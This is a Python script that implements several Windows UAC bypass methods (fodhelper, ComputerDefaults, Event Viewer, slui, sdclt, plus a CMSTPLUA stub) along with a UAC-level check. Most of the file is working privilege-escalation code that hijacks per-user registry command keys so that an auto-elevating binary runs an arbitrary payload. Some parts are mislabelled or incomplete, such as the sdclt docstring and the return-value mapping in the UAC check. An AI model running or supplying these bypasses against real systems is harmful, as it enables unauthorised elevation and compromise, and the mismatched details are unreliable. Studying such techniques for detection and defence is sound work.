#!/usr/bin/env python3
"""
UAC (User Account Control) Bypass Techniques
Elevates from medium integrity to high/system
Educational/Research purposes only
"""
import ctypes
import os
import subprocess
import winreg

class UACBypass:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        
    def fodhelper_bypass(self, payload):
        """
        Fodhelper.exe auto-elevate bypass
        Hijacks registry to execute arbitrary command
        """
        try:
            # Registry path
            reg_path = r"Software\Classes\ms-settings\Shell\Open\command"
            
            # Create key structure
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
                # Set default value to payload
                winreg.SetValueEx(key, None, 0, winreg.REG_SZ, payload)
                # Set DelegateExecute to trigger auto-elevation
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            
            # Trigger fodhelper (auto-elevates)
            subprocess.run(["fodhelper.exe"], shell=True)
            
            # Cleanup
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
            
            return True
            
        except Exception as e:
            print(f"[-] Fodhelper bypass failed: {e}")
            return False
    
    def computer_defaults_bypass(self, payload):
        """
        ComputerDefaults.exe hijack
        Same technique as fodhelper
        """
        reg_path = r"Software\Classes\ms-settings\Shell\Open\command"
        
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
            winreg.SetValueEx(key, None, 0, winreg.REG_SZ, payload)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        
        subprocess.run(["computerdefaults.exe"], shell=True)
        
        # Cleanup
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
        except:
            pass
    
    def slui_bypass(self, payload):
        """
        Slui.exe (Software Licensing) bypass
        """
        reg_path = r"Software\Classes\Exefile\Shell\Open\command"
        
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
            winreg.SetValueEx(key, None, 0, winreg.REG_SZ, payload)
        
        subprocess.run(["slui.exe"], shell=True)
    
    def event_viewer_bypass(self, payload):
        """
        Event Viewer hijack via registry
        """
        # HKCU\Software\Classes\mscfile\Shell\Open\command
        reg_path = r"Software\Classes\mscfile\Shell\Open\command"
        
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
            winreg.SetValueEx(key, None, 0, winreg.REG_SZ, payload)
        
        subprocess.run(["eventvwr.exe"], shell=True)
        
        # Cleanup
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
    
    def sdclt_bypass(self, payload):
        """
        SilentCleanup scheduled task bypass
        """
        # Hides behind scheduled task that runs with medium integrity
        # but can be hijacked
        
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
        
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
            winreg.SetValueEx(key, None, 0, winreg.REG_SZ, payload)
        
        subprocess.run(["sdclt.exe"], shell=True)
    
    def cmstplua_com_elevation(self):
        """
        COM interface elevation via CMSTPLUA
        """
        # CoCreateInstance with CMSTPLUA CLSID
        # Call LaunchAdminProcess
        # Bypasses UAC as this COM object is auto-elevate approved
        
        clsid_cmstplua = "{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
        # Would use pythoncom or similar to instantiate
        pass
    
    def check_uac_level(self):
        """
        Check UAC configuration level
        Returns: 0=AlwaysNotify, 1=Default, 2=Dimmed, 3=NeverNotify
        """
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
            )
            value, _ = winreg.QueryValueEx(key, "ConsentPromptBehaviorAdmin")
            winreg.CloseKey(key)
            return value
        except:
            return -1

if __name__ == "__main__":
    bypass = UACBypass()
    uac_level = bypass.check_uac_level()
    print(f"Current UAC level: {uac_level}")
    
    # Example: Try fodhelper
    # bypass.fodhelper_bypass("C:\\Windows\\System32\\cmd.exe /c whoami > C:\\temp\\admin.txt")